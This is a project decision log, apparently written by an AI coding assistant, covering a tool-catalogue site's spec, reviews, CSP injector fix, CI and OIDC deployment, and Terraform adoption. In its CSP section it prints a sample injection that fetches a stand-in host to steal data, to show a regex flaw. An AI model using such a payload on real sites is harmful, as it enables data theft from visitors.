# Decision log

Informal, for archaeology. Why things are the way they are, including the ones
that turned out wrong and the ones still open.

A caveat on provenance: the earlier session's conversation is not available to
me. Everything about it below is reconstructed from the artefacts it left —
`spec/`, commit `a47e2d7`, and `operator-setup.md` — so it records *what* was
decided reliably, and *why* only where the repo says so. Anything from
2026-08-22 onward is first-hand.

---

## The earlier session — the shape of the thing

**A spec pipeline before any code.** `spec/spec.md` → `criteria.md` → `rules.md`
→ `tasks.yaml`, each traceable to the last. Unusual, and it has paid off
repeatedly since: several arguments in the later session were settled by reading
a rule rather than by opinion.

**Ports and fakes first.** Four ports — storage, identity, scanning,
notification — with a contract suite each, and phase-0 fakes behind them. The
point (RULE-46) is that the same suite runs against the real adapters later and
is *never weakened*: if the real one cannot pass unchanged, the port is wrong.

**A tracer test written before the code, then frozen.** TC-T01 walks the whole
journey — browse, run, download, drop, submit, approve, publish. RULE-47 freezes
it after cp-0: if it goes red the product broke, not the test. This turned out to
matter more than once (below).

**Fakes that are honestly awkward.** The phase-0 storage is a real directory on
disk, not an in-memory map, because the submit server and the review CLI are
separate processes and have to see the same records. Faking it in memory would
have hidden that constraint until something else needed to read the data.

**A workspace graph that is the security model.** `domain` depends on nothing;
`site` sees only `domain`; `tests/` is a standalone project so it can only test
from outside. RULE-48 makes the boundaries mechanical rather than a matter of
discipline.

**Infrastructure built by CLI as a smoke test.** Route 53, ACM, CloudFront, S3 —
provisioned by hand to prove the path worked end to end. Deliberate, and
`operator-setup.md` flagged at the time that task-1.3 would have to import or
recreate them. That debt came due in the later session.

---

## 2026-08-22 — reviews, then the pipeline

### Two external code reviews arrived, and not everything in them was true

The habit that mattered: **verify every finding against the running code before
acting on it.** Of the first review's items, two did not survive contact:

- Branded `UserId`/`SubmissionId` types — a correct critique, but the fix is a
  migration. `{value: string}` is the serialised shape in `index.json` and
  `published.json` that the site reads. Deferred as a spec decision, not a patch.
- The `execFileSync`/CWD fix in the tracer — **not available**. TC-T01 is frozen,
  and the test plan marks it `done`, so the "may still be corrected" window in
  RULE-47 is closed.

And the security review proposed a fix that would have **broken the site**:
`cross-origin-resource-policy: same-origin` on the runner. The catalogue framing
the runner cross-origin is the whole design, and CORP `same-origin` blocks
exactly that. Only the `cache-control` part of that recommendation was sound.

The general lesson: a plausible review is not a correct one, and a fix that
sounds like hardening can be a regression.

### The CSP injector was genuinely broken

The most serious finding, and worse than reported. The regex injector matched
`<head>` *inside an HTML comment*:

```
in:   <!-- <head> --><script>fetch('https://evil.test/steal')</script>
out:  <!-- <head><meta http-equiv="Content-Security-Policy" ...> -->
```

The policy shipped **inside an inert comment** — the file published with no
policy at all. Replaced with parse5 (task-1.5, already required by RULE-45).
TC-CSP10/11/12 went from `fixme` to green on three engines.

Worth recording honestly: this was **not an undiscovered vulnerability**. The
placeholder's own docstring named all three defects and pointed at task-1.5. The
review found a real hole; the repo already knew its shape.

### Fixes chosen at the layer the problem actually lives on

A recurring theme, and the most portable idea in this log.

- **Corrupted store index** silently reset the store to empty, because one
  `catch` covered both "missing" and "unreadable". Fixed by distinguishing them
  — but also by making the *write* atomic, so a half-written file stops
  happening at all. The review only asked for the first.
- **`/run/...` returned 403** because CloudFront resolves a default root object
  for `/` only. Two fixes existed: an edge function, or `build.format: 'file'`.
  Chose the edge function, because the second shapes the *application's* URLs
  around an *S3* limitation, and would need unpicking later. Add layers you
  control; don't distort the thing underneath.
- **CSP injection is a containment wrapper, not a rewrite** — which is why it is
  safe. That distinction became the argument against auto-rewriting submissions,
  before the product intent changed.

### Tests: the ones that lie are worse than the ones that fail

- A **mutation sweep** (12 deliberate bugs) found 11 caught, 1 missed — and the
  miss was `review-cli`, which had no tests at all, and was exactly where the
  `reject` bug had shipped from. Introducing bugs on purpose found the gap that
  reading the suite had not.
- A **contract test asserted nothing**: the scanner's "a rejection carries
  findings" case sat inside `if (verdict === 'reject')`, and the phase-0 stub
  passes everything. Now a visible `skip` with a sample parameter for semgrep. A
  skipped test tells you something; a green one that asserts nothing lies.
- **Unit tests passed while the real CLI was broken** — a TypeScript parameter
  property, fine under Vitest's esbuild transform, fatal under Node's strip-only
  type stripping. Different transforms, so a whole class of error is invisible
  until e2e.

### The repo went public, and history is not the working tree

Redacting a personal email from a file does nothing about the commit that added
it. Caught before the first push, when a rewrite was still cheap; after
publication, forks and caches make it permanent. The rewrite itself was blocked
by the sandbox and handed to the operator to run — correct, for a destructive
history operation.

Everything committed is now checked against a placeholder discipline: no account
ids, bucket names or distribution ids in tracked files. `infra/` holds templates;
real values live in gitignored inputs.

---

## 2026-08-22 evening — deployment

### OIDC over stored access keys

GitHub mints a short-lived token proving "this run is from this repo on this
branch"; AWS is configured to trust exactly that claim. Nothing secret is stored,
nothing needs rotating. The role ARN is a *variable*, not a secret — it is inert
to anyone whose token does not match.

**The trap that cost an hour.** The `sub` claim now embeds immutable numeric ids:

```
repo:McFunshine@181626727/mimawsi@1342919299:ref:refs/heads/main
```

A trust policy written against the older `repo:OWNER/REPO:...` form silently
never matches, and AWS answers only `Not authorized` with no reason. Guessing
failed repeatedly; **printing the actual claims** from a workflow step solved it
in one run. When a system refuses to say why, make it show you what it saw.

I first proposed matching on `repository_id` and `ref_type` instead — more
"correct", but it relies on AWS resolving arbitrary custom claims. Reverted to
`sub`, which is a first-class condition key *and* already contains both immutable
ids. The simpler option was also the stronger one.

### CI was 94% waste

Installing browsers took 10m39s of a 12m build, and pulled a slightly different
browser build each time — so "passes in CI" meant something marginally different
every push. Pinned Playwright container: ~25s, reproducible.

Then TC-T01 failed in CI in a way it never did locally, because CI turns on
retries and cold-starts the servers. Two distinct causes:

1. `globalSetup` reset state **once per run**, but retries re-ran the test. The
   first attempt had already *published*, so the retry hit the duplicate-file
   check and failed at a completely different step — **hiding the original
   cause**. Reset is now per-test.
2. The review CLI rewrote `published.json` in place while Astro watched it.
   Written to a sibling and renamed since.

`npm run test:e2e:ci` exists so CI conditions are reproducible locally.

### The runner needed no certificate

RULE-23 requires tools to execute on a distinct origin, and `operator-setup.md`
listed the `runner.mimawsi.com` certificate as an open blocker. It wasn't one: a
second distribution's own `*.cloudfront.net` name is *already* a distinct origin.
No certificate, no DNS, boundary satisfied. A blocker that dissolved once the
actual requirement was read rather than the assumed one.

---

## 2026-08-23 — infrastructure as code

### Terraform, and why not the TypeScript options

The natural pull was CDK or Pulumi — the project is TypeScript everywhere. Two
things settled it against:

- The "TypeScript everywhere" rule is scoped to *what shares a contract with the
  browser*. Infrastructure shares none. And rules.md:365 says the IaC choice
  "constrains nobody's code".
- **CDK cannot adopt what already exists.** Its `from*` methods create
  *references*, not managed resources. With eight hand-built resources already
  serving traffic, that is disqualifying. Terraform's `import` blocks plus
  `-generate-config-out` adopted them with `plan` reporting **no changes**.

Open: **OpenTofu**. Terraform 1.5.7 is the last MPL release, which is presumably
why it is pinned; OpenTofu is the MPL fork and has S3-native state locking,
removing the DynamoDB-just-for-locking dependency.

### Two identities, deliberately

The CI deploy role stays narrow — RULE-17a keeps Actions away from DynamoDB and
the published prefix, because the pipeline processes hostile input. Terraform is a
different job and got a different, broader policy, scoped by `mimawsi-*` prefix
because the account also hosts unrelated projects. IAM in it is **read-only**:
Terraform must read the deploy role to adopt it, and write access would let a
Terraform run rewrite the trust policy that is the entire CI security boundary.

### Index design is the data model

The submissions table carries three GSIs, each because a question cannot be
answered from the primary key: state (the review queue — which is why no queue
service is needed at this volume), sha256 (dedupe must be a lookup, not a scan),
and account (ownership checks and the rolling limit). Bans are keyed on a
*subject* rather than an account id, so deleting an account cannot lift one.

---

## Open, and genuinely undecided

1. **The rewrite model is a scope change that exists only in conversation.**
   spec.md:151 lists "automated rewriting or improvement of tools" as a
   **non-goal**, and phases 4–5 are specced against reject-with-reason-and-remedy
   (AC-41/42/43). The stated intent is now the opposite: the audience is vibe
   coders who are attributed for the *idea*, and the platform fixes the code,
   because telling someone who cannot read the code to go fix it is friction they
   cannot act on. That reasoning is sound and it invalidates a chunk of the spec.
   Run `/01-spec` before building phase 4.
   Consequences worth holding onto: stamping code as checked **inverts
   liability** — you author what ships; an open-source licence's warranty
   disclaimer is the intended mitigation; and it needs inbound terms granting the
   right to modify and redistribute.
2. **Whether tools should live in a published bucket** rather than the site
   bucket's `/tools` prefix. task-1.3 says yes; moving them changes a live origin.
3. **What triggers the scan workflow.** Nothing in the spec says.
   `repository_dispatch` from the upload Lambda is the obvious answer.
4. **Repo-per-submission was proposed and argued down.** Actions can process a
   file that never enters git: check out the tooling, pull the submission from S3
   into an ephemeral workspace. Repo-per-submission hits API rate limits, leaves
   abandoned repos, and would expose unreviewed hostile submissions publicly.
   Content addressing (RULE-12) also makes the naming problem disappear.

---

## Things I got wrong in these sessions

Recorded because they are the useful part.

- Told the operator to click **"Get thumbprint"**, which AWS removed.
- Proposed a trust policy against the **old `sub` format**, then proposed a
  "better" one relying on custom claims before reverting to the simpler,
  stronger `sub` match.
- Wrote an IAM policy with a `_comment` key, which IAM rejects — then said
  "delete that line" instead of just supplying a file that works.
- Buried console instructions in a file and only linked it, when the operator had
  asked to be walked through them.
- Wrote a test that **wrote outside its own temp directory**, and a second one
  whose `mkdtemp` trusted a relative `TMPDIR` — together scattering thirty-odd
  directories through the repo root.
- **Committed twenty of them to a public repo** via a careless `git add -A`, and
  did not notice until the operator asked what the weird files were. They contain
  nothing sensitive and are now removed, but `add -A` deserves a look at what it
  swept up.
